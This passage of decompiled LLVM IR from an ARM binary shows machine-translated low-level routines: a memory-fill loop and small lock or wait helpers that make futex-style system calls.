dec_label_pc_1556c:                               ; preds = %dec_label_pc_15554
  %v0_1556c = load i32, i32* %r3.global-to-local, align 4
  %v2_1556c = icmp ugt i32 %v0_1556c, 5
  store i1 %v2_1556c, i1* %cpsr_c.global-to-local, align 1
  %v7_1556c = icmp eq i32 %v0_1556c, 6
  store i1 %v7_1556c, i1* %cpsr_z.global-to-local, align 1
  %v0_15570 = load i32, i32* @ip, align 4
  %v1_15570 = trunc i32 %v0_15570 to i8
  %v2_15570 = load i32, i32* %r2.global-to-local, align 4
  %v3_15570 = add i32 %v2_15570, -2
  %v4_15570 = inttoptr i32 %v3_15570 to i8*
  store i8 %v1_15570, i8* %v4_15570, align 1
  %v0_15574 = load i32, i32* @ip, align 4
  %v1_15574 = trunc i32 %v0_15574 to i8
  %v4_15574 = add i32 %tmp, 1
  %v5_15574 = inttoptr i32 %v4_15574 to i8*
  store i8 %v1_15574, i8* %v5_15574, align 1
  %v0_15578 = load i32, i32* @ip, align 4
  %v1_15578 = trunc i32 %v0_15578 to i8
  %v2_15578 = load i32, i32* %r2.global-to-local, align 4
  %v3_15578 = add i32 %v2_15578, -3
  %v4_15578 = inttoptr i32 %v3_15578 to i8*
  store i8 %v1_15578, i8* %v4_15578, align 1
  %v0_1557c = load i32, i32* @ip, align 4
  %v1_1557c = trunc i32 %v0_1557c to i8
  %v4_1557c = add i32 %tmp, 2
  %v5_1557c = inttoptr i32 %v4_1557c to i8*
  store i8 %v1_1557c, i8* %v5_1557c, align 1
  %v0_15580 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_15580 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v2_15580 = xor i1 %v1_15580, true
  %v3_15580 = or i1 %v0_15580, %v2_15580
  br i1 %v3_15580, label %dec_label_pc_1565c, label %dec_label_pc_15584

dec_label_pc_15584:                               ; preds = %dec_label_pc_1556c
  %v0_15584 = load i32, i32* %r3.global-to-local, align 4
  %v2_15584 = icmp ugt i32 %v0_15584, 7
  store i1 %v2_15584, i1* %cpsr_c.global-to-local, align 1
  %v7_15584 = icmp eq i32 %v0_15584, 8
  store i1 %v7_15584, i1* %cpsr_z.global-to-local, align 1
  %v0_15588 = load i32, i32* @ip, align 4
  %v1_15588 = trunc i32 %v0_15588 to i8
  %v2_15588 = load i32, i32* %r2.global-to-local, align 4
  %v3_15588 = add i32 %v2_15588, -4
  %v4_15588 = inttoptr i32 %v3_15588 to i8*
  store i8 %v1_15588, i8* %v4_15588, align 1
  %v0_1558c = load i32, i32* @ip, align 4
  %v1_1558c = trunc i32 %v0_1558c to i8
  %v4_1558c = add i32 %tmp, 3
  %v5_1558c = inttoptr i32 %v4_1558c to i8*
  store i8 %v1_1558c, i8* %v5_1558c, align 1
  %v0_15590 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_15590 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v2_15590 = xor i1 %v1_15590, true
  %v3_15590 = or i1 %v0_15590, %v2_15590
  br i1 %v3_15590, label %dec_label_pc_1565c, label %dec_label_pc_15594

dec_label_pc_15594:                               ; preds = %dec_label_pc_15584
  %v2_15594 = sub i32 0, %tmp
  %v1_15598 = urem i32 %v2_15594, 4
  store i32 %v1_15598, i32* %r1.global-to-local, align 4
  %v0_1559c = load i32, i32* @ip, align 4
  %v2_155a0 = mul i32 %v0_1559c, 257
  store i32 %v2_155a0, i32* %r2.global-to-local, align 4
  %v1_155a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_155a4 = sub i32 %v1_155a4, %v1_15598
  %v1_155a8 = and i32 %v2_155a4, -4
  store i32 %v1_155a8, i32* %lr.global-to-local, align 4
  %v3_155ac = add i32 %v1_15598, %tmp
  store i32 %v3_155ac, i32* %r6.global-to-local, align 4
  %v3_155b0 = mul i32 %v0_1559c, 16842752
  store i32 %v3_155b0, i32* %r3.global-to-local, align 4
  %v2_155b4 = mul i32 %v0_1559c, 16843009
  store i32 %v2_155b4, i32* @ip, align 4
  %v2_155b8 = add i32 %v1_155a8, %v3_155ac
  store i32 %v2_155b8, i32* %r5.global-to-local, align 4
  %v2_155bc = icmp ugt i32 %v1_155a8, 7
  store i1 %v2_155bc, i1* %cpsr_c.global-to-local, align 1
  %v7_155bc = icmp eq i32 %v1_155a8, 8
  store i1 %v7_155bc, i1* %cpsr_z.global-to-local, align 1
  %v5_155c0 = inttoptr i32 %v3_155ac to i32*
  store i32 %v2_155b4, i32* %v5_155c0, align 4
  %v0_155c4 = load i32, i32* @ip, align 4
  %v1_155c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_155c4 = add i32 %v1_155c4, -4
  %v3_155c4 = inttoptr i32 %v2_155c4 to i32*
  store i32 %v0_155c4, i32* %v3_155c4, align 4
  %v2_155c8 = xor i1 %v2_155bc, true
  %v3_155c8 = or i1 %v7_155bc, %v2_155c8
  br i1 %v3_155c8, label %dec_label_pc_1565c, label %dec_label_pc_155cc

dec_label_pc_155cc:                               ; preds = %dec_label_pc_15594
  %v0_155cc = load i32, i32* %lr.global-to-local, align 4
  %v2_155cc = icmp ugt i32 %v0_155cc, 23
  store i1 %v2_155cc, i1* %cpsr_c.global-to-local, align 1
  %v7_155cc = icmp eq i32 %v0_155cc, 24
  store i1 %v7_155cc, i1* %cpsr_z.global-to-local, align 1
  %v0_155d0 = load i32, i32* @ip, align 4
  %v1_155d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_155d0 = add i32 %v1_155d0, 4
  %v3_155d0 = inttoptr i32 %v2_155d0 to i32*
  store i32 %v0_155d0, i32* %v3_155d0, align 4
  %v0_155d4 = load i32, i32* @ip, align 4
  %v1_155d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_155d4 = add i32 %v1_155d4, 8
  %v3_155d4 = inttoptr i32 %v2_155d4 to i32*
  store i32 %v0_155d4, i32* %v3_155d4, align 4
  %v0_155d8 = load i32, i32* @ip, align 4
  %v1_155d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_155d8 = add i32 %v1_155d8, -12
  %v3_155d8 = inttoptr i32 %v2_155d8 to i32*
  store i32 %v0_155d8, i32* %v3_155d8, align 4
  %v0_155dc = load i32, i32* @ip, align 4
  %v1_155dc = load i32, i32* %r5.global-to-local, align 4
  %v2_155dc = add i32 %v1_155dc, -8
  %v3_155dc = inttoptr i32 %v2_155dc to i32*
  store i32 %v0_155dc, i32* %v3_155dc, align 4
  %v2_155e0 = xor i1 %v2_155cc, true
  %v3_155e0 = or i1 %v7_155cc, %v2_155e0
  br i1 %v3_155e0, label %dec_label_pc_1565c, label %dec_label_pc_155e4

dec_label_pc_155e4:                               ; preds = %dec_label_pc_155cc
  %v0_155e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_155e4 = and i32 %v0_155e4, 4
  %v1_155e8 = or i32 %v1_155e4, 24
  store i32 %v1_155e8, i32* %r7.global-to-local, align 4
  %v1_155ec = load i32, i32* %lr.global-to-local, align 4
  %v2_155ec = sub i32 %v1_155ec, %v1_155e8
  store i32 %v2_155ec, i32* %lr.global-to-local, align 4
  %v0_155f0 = load i32, i32* @ip, align 4
  store i32 %v0_155f0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_155fc = icmp ugt i32 %v2_155ec, 30
  store i1 %v2_155fc, i1* %cpsr_c.global-to-local, align 1
  %v7_155fc = icmp eq i32 %v2_155ec, 31
  store i1 %v7_155fc, i1* %cpsr_z.global-to-local, align 1
  %v2_15600 = add i32 %v0_155e4, 12
  %v3_15600 = inttoptr i32 %v2_15600 to i32*
  store i32 %v0_155f0, i32* %v3_15600, align 4
  %v0_15604 = load i32, i32* @ip, align 4
  %v1_15604 = load i32, i32* %r6.global-to-local, align 4
  %v2_15604 = add i32 %v1_15604, 16
  %v3_15604 = inttoptr i32 %v2_15604 to i32*
  store i32 %v0_15604, i32* %v3_15604, align 4
  %v0_15608 = load i32, i32* @ip, align 4
  %v1_15608 = load i32, i32* %r6.global-to-local, align 4
  %v2_15608 = add i32 %v1_15608, 20
  %v3_15608 = inttoptr i32 %v2_15608 to i32*
  store i32 %v0_15608, i32* %v3_15608, align 4
  %v0_1560c = load i32, i32* @ip, align 4
  %v1_1560c = load i32, i32* %r6.global-to-local, align 4
  %v2_1560c = add i32 %v1_1560c, 24
  %v3_1560c = inttoptr i32 %v2_1560c to i32*
  store i32 %v0_1560c, i32* %v3_1560c, align 4
  %v0_15610 = load i32, i32* %r3.global-to-local, align 4
  %v1_15610 = load i32, i32* %r1.global-to-local, align 4
  %v2_15610 = or i32 %v1_15610, %v0_15610
  store i32 %v2_15610, i32* %r3.global-to-local, align 4
  %v1_15614 = load i32, i32* %r2.global-to-local, align 4
  %v2_15614 = or i32 %v1_15614, %v1_15610
  store i32 %v2_15614, i32* %r4.global-to-local, align 4
  %v0_15618 = load i32, i32* @ip, align 4
  %v1_15618 = load i32, i32* %r5.global-to-local, align 4
  %v2_15618 = add i32 %v1_15618, -16
  %v3_15618 = inttoptr i32 %v2_15618 to i32*
  store i32 %v0_15618, i32* %v3_15618, align 4
  %v0_1561c = load i32, i32* @ip, align 4
  %v1_1561c = load i32, i32* %r5.global-to-local, align 4
  %v2_1561c = add i32 %v1_1561c, -28
  %v3_1561c = inttoptr i32 %v2_1561c to i32*
  store i32 %v0_1561c, i32* %v3_1561c, align 4
  %v0_15620 = load i32, i32* @ip, align 4
  %v1_15620 = load i32, i32* %r5.global-to-local, align 4
  %v2_15620 = add i32 %v1_15620, -24
  %v3_15620 = inttoptr i32 %v2_15620 to i32*
  store i32 %v0_15620, i32* %v3_15620, align 4
  %v0_15624 = load i32, i32* @ip, align 4
  %v1_15624 = load i32, i32* %r5.global-to-local, align 4
  %v2_15624 = add i32 %v1_15624, -20
  %v3_15624 = inttoptr i32 %v2_15624 to i32*
  store i32 %v0_15624, i32* %v3_15624, align 4
  %v2_15628 = xor i1 %v2_155fc, true
  %v3_15628 = or i1 %v7_155fc, %v2_15628
  br i1 %v3_15628, label %dec_label_pc_1565c, label %dec_label_pc_1562c

dec_label_pc_1562c:                               ; preds = %dec_label_pc_155e4
  %v0_1562c = load i32, i32* %r6.global-to-local, align 4
  %v1_1562c = load i32, i32* %r7.global-to-local, align 4
  %v2_1562c = add i32 %v1_1562c, %v0_1562c
  store i32 %v2_1562c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15630

dec_label_pc_15630:                               ; preds = %dec_label_pc_15630, %dec_label_pc_1562c
  %v0_15638 = phi i32 [ %v1_15654, %dec_label_pc_15630 ], [ %v2_1562c, %dec_label_pc_1562c ]
  %v0_15630 = load i32, i32* %lr.global-to-local, align 4
  %v1_15630 = add i32 %v0_15630, -32
  store i32 %v1_15630, i32* %lr.global-to-local, align 4
  %v2_15634 = icmp ugt i32 %v1_15630, 30
  %v7_15634 = icmp eq i32 %v1_15630, 31
  %v1_15638 = inttoptr i32 %v0_15638 to i32*
  %v2_15638 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_15638, i32* %v1_15638, align 4
  %v3_15638 = add i32 %v0_15638, 4
  %v4_15638 = inttoptr i32 %v3_15638 to i32*
  %v5_15638 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15638, i32* %v4_15638, align 4
  %v0_1563c = load i32, i32* %r3.global-to-local, align 4
  %v1_1563c = load i32, i32* %r2.global-to-local, align 4
  %v2_1563c = add i32 %v1_1563c, 8
  %v3_1563c = inttoptr i32 %v2_1563c to i32*
  store i32 %v0_1563c, i32* %v3_1563c, align 4
  %v0_15640 = load i32, i32* %r4.global-to-local, align 4
  %v1_15640 = load i32, i32* %r2.global-to-local, align 4
  %v2_15640 = add i32 %v1_15640, 12
  %v3_15640 = inttoptr i32 %v2_15640 to i32*
  store i32 %v0_15640, i32* %v3_15640, align 4
  %v0_15644 = load i32, i32* %r3.global-to-local, align 4
  %v1_15644 = load i32, i32* %r2.global-to-local, align 4
  %v2_15644 = add i32 %v1_15644, 16
  %v3_15644 = inttoptr i32 %v2_15644 to i32*
  store i32 %v0_15644, i32* %v3_15644, align 4
  %v0_15648 = load i32, i32* %r4.global-to-local, align 4
  %v1_15648 = load i32, i32* %r2.global-to-local, align 4
  %v2_15648 = add i32 %v1_15648, 20
  %v3_15648 = inttoptr i32 %v2_15648 to i32*
  store i32 %v0_15648, i32* %v3_15648, align 4
  %v0_1564c = load i32, i32* %r3.global-to-local, align 4
  %v1_1564c = load i32, i32* %r2.global-to-local, align 4
  %v2_1564c = add i32 %v1_1564c, 24
  %v3_1564c = inttoptr i32 %v2_1564c to i32*
  store i32 %v0_1564c, i32* %v3_1564c, align 4
  %v0_15650 = load i32, i32* %r4.global-to-local, align 4
  %v1_15650 = load i32, i32* %r2.global-to-local, align 4
  %v2_15650 = add i32 %v1_15650, 28
  %v3_15650 = inttoptr i32 %v2_15650 to i32*
  store i32 %v0_15650, i32* %v3_15650, align 4
  %v0_15654 = load i32, i32* %r2.global-to-local, align 4
  %v1_15654 = add i32 %v0_15654, 32
  store i32 %v1_15654, i32* %r2.global-to-local, align 4
  %v2_15658 = xor i1 %v7_15634, true
  %v3_15658 = and i1 %v2_15634, %v2_15658
  br i1 %v3_15658, label %dec_label_pc_15630, label %dec_label_pc_1565c.loopexit

dec_label_pc_1565c.loopexit:                      ; preds = %dec_label_pc_15630
  store i1 %v2_15634, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_15634, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1565c

dec_label_pc_1565c:                               ; preds = %dec_label_pc_1565c.loopexit, %dec_label_pc_155e4, %dec_label_pc_155cc, %dec_label_pc_15584, %dec_label_pc_1556c, %dec_label_pc_15554, %dec_label_pc_15548, %dec_label_pc_15594
  %v2_1565c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1565c, i32* @r4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_15654, { 1, 0 }
  uselistorder i1 %v7_15634, { 1, 0 }
  uselistorder i32 %v0_15638, { 1, 0 }
  uselistorder i32 %v0_155cc, { 1, 0 }
  uselistorder i32 %v3_155ac, { 1, 0, 2 }
  uselistorder i32 %v1_155a8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_15598, { 2, 1, 0 }
  uselistorder i32 %v0_15584, { 1, 0 }
  uselistorder i32 %v0_1556c, { 1, 0 }
  uselistorder i32 %tmp, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r6.global-to-local, { 6, 0, 1, 2, 4, 3, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 9, 10, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 9, 10, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 -16, { 6, 0, 4, 5, 1, 2, 3 }
  uselistorder i32 30, { 6, 7, 4, 5, 0, 12, 13, 8, 1, 9, 2, 10, 3, 11, 14 }
  uselistorder i32 -3, { 4, 2, 0, 1, 3 }
  uselistorder i32 %arg3, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1565c, { 0, 1, 2, 7, 3, 4, 5, 6 }
}

define i32 @function_15664(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15664:
  ret i32 %arg2
}

define i32 @function_15684(i32* %arg1) local_unnamed_addr {
dec_label_pc_15684:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_15684 = load i32, i32* @r0, align 4
  %v1_15684 = inttoptr i32 %v0_15684 to i32*
  %v2_15684 = load i32, i32* %v1_15684, align 4
  %v2_15688 = icmp eq i32 %v2_15684, 0
  store i1 %v2_15688, i1* @cpsr_z, align 1
  %v3_1568c = load i32, i32* @r4, align 4
  store i32 %v3_1568c, i32* %stack_var_-8, align 4
  store i32 %v0_15684, i32* %r4.global-to-local, align 4
  br i1 %v2_15688, label %dec_label_pc_156e8, label %dec_label_pc_15698

dec_label_pc_15698:                               ; preds = %dec_label_pc_15684
  %v0_15698 = call i32 @function_15c98()
  store i32 %v0_15698, i32* @r0, align 4
  %v2_156a0 = inttoptr i32 %v0_15698 to i32*
  store i32 0, i32* %v2_156a0, align 4
  %v0_156a4 = call i32 @function_15c98()
  %v1_156a8 = add i32 %v0_156a4, 4
  %v2_156a8 = inttoptr i32 %v1_156a8 to i32*
  %v3_156a8 = load i32, i32* %v2_156a8, align 4
  %v2_156ac = icmp eq i32 %v3_156a8, 0
  br i1 %v2_156ac, label %dec_label_pc_156e8, label %dec_label_pc_156b4

dec_label_pc_156b4:                               ; preds = %dec_label_pc_15698
  %v0_156b8 = load i32, i32* %r4.global-to-local, align 4
  %v4_156c4 = call i32 @function_15664(i32 240, i32 %v0_156b8, i32 129, i32 1)
  %v4_156cc = icmp eq i32 %v4_156c4, -38
  br i1 %v4_156cc, label %dec_label_pc_156d0, label %dec_label_pc_156e8

dec_label_pc_156d0:                               ; preds = %dec_label_pc_156b4
  %v0_156d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_156e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_156e0, i32* %r4.global-to-local, align 4
  %v4_156e4 = call i32 @function_15664(i32 240, i32 %v0_156d4, i32 1, i32 1)
  br label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_156b4, %dec_label_pc_15698, %dec_label_pc_15684, %dec_label_pc_156d0
  %v1_156ec = phi i32 [ %v4_156c4, %dec_label_pc_156b4 ], [ %v0_156a4, %dec_label_pc_15698 ], [ %v0_15684, %dec_label_pc_15684 ], [ %v4_156e4, %dec_label_pc_156d0 ]
  %v2_156e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_156e8, i32* %r4.global-to-local, align 4
  ret i32 %v1_156ec

; uselistorder directives
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @function_15664, { 1, 0 }
  uselistorder label %dec_label_pc_156e8, { 3, 0, 1, 2 }
}

define i32 @function_156f0(i32* %arg1) local_unnamed_addr {
dec_label_pc_156f0:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_156f4 = load i32, i32* @global_var_22ae8.558, align 4
  %v2_156f8 = icmp eq i32 %v3_156f4, 0
  store i1 %v2_156f8, i1* @cpsr_z, align 1
  %v9_156fc = load i32, i32* @r6, align 4
  %v0_15700 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15700, i32* @r4, align 4
  br i1 %v2_156f8, label %dec_label_pc_15748, label %dec_label_pc_15714.preheader

dec_label_pc_15714.preheader:                     ; preds = %dec_label_pc_156f0
  %v2_15704 = add i32 %v0_15700, 4
  store i32 %v2_15704, i32* @r6, align 4
  br label %dec_label_pc_15714

dec_label_pc_15710:                               ; preds = %dec_label_pc_15730
  %v2_15710 = inttoptr i32 %v0_15738 to i32*
  %v3_15710 = call i32 @function_15818(i32* %v2_15710, i32 %v0_1573c)
  store i32 %v3_15710, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15714.backedge

dec_label_pc_15714.backedge:                      ; preds = %dec_label_pc_15710, %dec_label_pc_15714
  %v0_15714.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15714

dec_label_pc_15714:                               ; preds = %dec_label_pc_15714.backedge, %dec_label_pc_15714.preheader
  %v0_15714 = phi i32 [ %v0_15714.pre, %dec_label_pc_15714.backedge ], [ %v0_15700, %dec_label_pc_15714.preheader ]
  %v1_15714 = inttoptr i32 %v0_15714 to i32*
  %v2_15714 = load i32, i32* %v1_15714, align 4
  store i32 %v2_15714, i32* @r5, align 4
  store i32 %v2_15714, i32* %r0.global-to-local, align 4
  %v4_15724 = call i32 @function_15cec(i32 %v2_15714, i32 1, i32* %v1_15714)
  store i32 %v4_15724, i32* %r0.global-to-local, align 4
  %v2_15728 = icmp eq i32 %v4_15724, 0
  store i1 %v2_15728, i1* @cpsr_z, align 1
  br i1 %v2_15728, label %dec_label_pc_15730, label %dec_label_pc_15714.backedge

dec_label_pc_15730:                               ; preds = %dec_label_pc_15714
  store i32 1, i32* @r2, align 4
  %v0_15734 = load i32, i32* @r5, align 4
  %v2_15734 = icmp eq i32 %v0_15734, 0
  %v0_15738 = load i32, i32* @r4, align 4
  store i32 %v0_15738, i32* %r0.global-to-local, align 4
  %v0_1573c = load i32, i32* @r6, align 4
  store i32 1, i32* @r3, align 4
  br i1 %v2_15734, label %dec_label_pc_15748.loopexit, label %dec_label_pc_15710

dec_label_pc_15748.loopexit:                      ; preds = %dec_label_pc_15730
  br label %dec_label_pc_15748

dec_label_pc_15748:                               ; preds = %dec_label_pc_15748.loopexit, %dec_label_pc_156f0
  %v1_1574c = phi i32 [ %v0_15738, %dec_label_pc_15748.loopexit ], [ %v0_15700, %dec_label_pc_156f0 ]
  store i32 %v9_156fc, i32* @r6, align 4
  ret i32 %v1_1574c

; uselistorder directives
  uselistorder i32 %v0_15738, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_15714.backedge, { 1, 0 }
}

define i32 @function_15754(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15754:
  %v0_15754 = load i32, i32* @lr, align 4
  store i32 87936, i32* @lr, align 4
  %v1_1577c = call i32 @function_15790()
  store i32 %v0_15754, i32* @lr, align 4
  ret i32 %v1_1577c
}

define i32 @function_15790() local_unnamed_addr {
dec_label_pc_15790:
  %v0_157b0 = call i32 @function_16888()
  ret i32 %v0_157b0
}

define i32 @function_157c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_157c0:
  ret i32 %arg2
}

define i32 @function_157e4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_157e4:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_157e4 = load i32, i32* @r4, align 4
  store i32 %v3_157e4, i32* %stack_var_-16, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_157f0

dec_label_pc_157f0:                               ; preds = %dec_label_pc_157f0.dec_label_pc_157f0_crit_edge, %dec_label_pc_157e4
  %v0_157fc = phi i32 [ %v0_157fc.pre, %dec_label_pc_157f0.dec_label_pc_157f0_crit_edge ], [ %arg2, %dec_label_pc_157e4 ]
  %v0_157f0 = phi i32 [ %v0_157f0.pre, %dec_label_pc_157f0.dec_label_pc_157f0_crit_edge ], [ %tmp, %dec_label_pc_157e4 ]
  %v1_157f0 = inttoptr i32 %v0_157f0 to i32*
  %v2_157f0 = load i32, i32* %v1_157f0, align 4
  store i32 %v2_157f0, i32* %r4.global-to-local, align 4
  %v2_157fc = add i32 %v2_157f0, %v0_157fc
  %v4_15800 = call i32 @function_15cec(i32 %v2_157f0, i32 %v2_157fc, i32* %v1_157f0)
  %v2_15804 = icmp eq i32 %v4_15800, 0
  store i1 %v2_15804, i1* @cpsr_z, align 1
  br i1 %v2_15804, label %dec_label_pc_1580c, label %dec_label_pc_157f0.dec_label_pc_157f0_crit_edge

dec_label_pc_157f0.dec_label_pc_157f0_crit_edge:  ; preds = %dec_label_pc_157f0
  %v0_157f0.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_157fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_157f0

dec_label_pc_1580c:                               ; preds = %dec_label_pc_157f0
  %v0_1580c = load i32, i32* %r4.global-to-local, align 4
  %v2_15810 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15810, i32* %r4.global-to-local, align 4
  ret i32 %v0_1580c

; uselistorder directives
  uselistorder i32 %v2_157f0, { 1, 0, 2 }
}

define i32 @function_15818(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15818:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v3_15818 = load i32, i32* @r4, align 4
  %v6_15818 = load i32, i32* @r5, align 4
  %v9_15818 = load i32, i32* @r6, align 4
  %v12_15818 = load i32, i32* @r7, align 4
  %v15_15818 = load i32, i32* @r8, align 4
  %v18_15818 = load i32, i32* @sl, align 4
  %v21_15818 = load i32, i32* @lr, align 4
  %v0_1581c = load i32, i32* @r3, align 4
  %v2_1581c = icmp eq i32 %v0_1581c, 0
  %v0_15820 = load i32, i32* @r2, align 4
  store i32 %v0_15820, i32* @r8, align 4
  %. = select i1 %v2_1581c, i32 0, i32 128
  store i32 %., i32* %sl.global-to-local, align 4
  %v0_15830 = load i32, i32* @r0, align 4
  store i32 %v0_15830, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 99, i32* %r2.global-to-local, align 4
  %v2_1585827 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_15858

dec_label_pc_15840:                               ; preds = %dec_label_pc_15860, %dec_label_pc_15858
  %v0_15840 = load i32, i32* @r6, align 4
  %v1_15840 = inttoptr i32 %v0_15840 to i32*
  %v2_15840 = load i32, i32* %v1_15840, align 4
  %v1_15844 = load i32, i32* @r8, align 4
  %v9_15844 = icmp eq i32 %v2_15840, %v1_15844
  store i1 %v9_15844, i1* @cpsr_z, align 1
  br i1 %v9_15844, label %dec_label_pc_1584c, label %dec_label_pc_158f0

dec_label_pc_1584c:                               ; preds = %dec_label_pc_15840
  %v0_1584c = call i32 @function_15c98()
  store i32 %v0_1584c, i32* @r0, align 4
  %v0_15850.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_15858.pre = load i32, i32* @r5, align 4
  %v1_15850 = add i32 %v0_15850.pre, -1
  store i32 %v1_15850, i32* %r2.global-to-local, align 4
  %v2_15850 = icmp eq i32 %v0_15850.pre, 0
  %v2_15858 = icmp eq i32 %v0_15858.pre, 0
  store i1 %v2_15858, i1* @cpsr_z, align 1
  br i1 %v2_15850, label %dec_label_pc_15870, label %dec_label_pc_15858

dec_label_pc_15858:                               ; preds = %dec_label_pc_15818, %dec_label_pc_1584c
  %v2_1585830 = phi i1 [ %v2_1585827, %dec_label_pc_15818 ], [ %v2_15858, %dec_label_pc_1584c ]
  %v0_1587829 = phi i32 [ %arg2, %dec_label_pc_15818 ], [ %v0_15858.pre, %dec_label_pc_1584c ]
  %v1_158f8828 = phi i32 [ %v0_15830, %dec_label_pc_15818 ], [ %v0_1584c, %dec_label_pc_1584c ]
  br i1 %v2_1585830, label %dec_label_pc_15840, label %dec_label_pc_15860

dec_label_pc_15860:                               ; preds = %dec_label_pc_15858
  %v1_15860 = inttoptr i32 %v0_1587829 to i32*
  %v2_15860 = load i32, i32* %v1_15860, align 4
  %v2_15864 = icmp eq i32 %v2_15860, 0
  store i1 %v2_15864, i1* @cpsr_z, align 1
  br i1 %v2_15864, label %dec_label_pc_15840, label %dec_label_pc_15878

dec_label_pc_15870:                               ; preds = %dec_label_pc_1584c
  br i1 %v2_15858, label %dec_label_pc_158b4, label %dec_label_pc_15870.dec_label_pc_15878_crit_edge

dec_label_pc_15870.dec_label_pc_15878_crit_edge:  ; preds = %dec_label_pc_15870
  %.pre = inttoptr i32 %v0_15858.pre to i32*
  br label %dec_label_pc_15878

dec_label_pc_15878:                               ; preds = %dec_label_pc_15860, %dec_label_pc_15870.dec_label_pc_15878_crit_edge
  %v2_15880.pre-phi = phi i32* [ %.pre, %dec_label_pc_15870.dec_label_pc_15878_crit_edge ], [ %v1_15860, %dec_label_pc_15860 ]
  %v3_15880 = call i32 @function_157e4(i32* %v2_15880.pre-phi, i32 1)
  br label %dec_label_pc_158b4

dec_label_pc_15888:                               ; preds = %dec_label_pc_158b8
  %v0_15888 = load i32, i32* %r7.global-to-local, align 4
  %v5_1588c = call i32 @function_157c0(i32 240, i32 %v0_158b8, i32 %v0_158c4, i32 %v2_158b8, i32 %v0_15888)
  %v4_15894 = icmp eq i32 %v5_1588c, -38
  br i1 %v4_15894, label %dec_label_pc_15898, label %dec_label_pc_158b8

dec_label_pc_15898:                               ; preds = %dec_label_pc_15888
  %v0_15898 = load i32, i32* %r4.global-to-local, align 4
  %v0_1589c = load i32, i32* @r6, align 4
  %v0_158a0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_158a0, i32* %r2.global-to-local, align 4
  %v5_158ac = call i32 @function_157c0(i32 240, i32 %v0_1589c, i32 %v0_158a0, i32 %v0_15898, i32 %v0_158a0)
  br label %dec_label_pc_158b8

dec_label_pc_158b4:                               ; preds = %dec_label_pc_15870, %dec_label_pc_15878
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_158b8

dec_label_pc_158b8:                               ; preds = %dec_label_pc_15888, %dec_label_pc_15898, %dec_label_pc_158b4
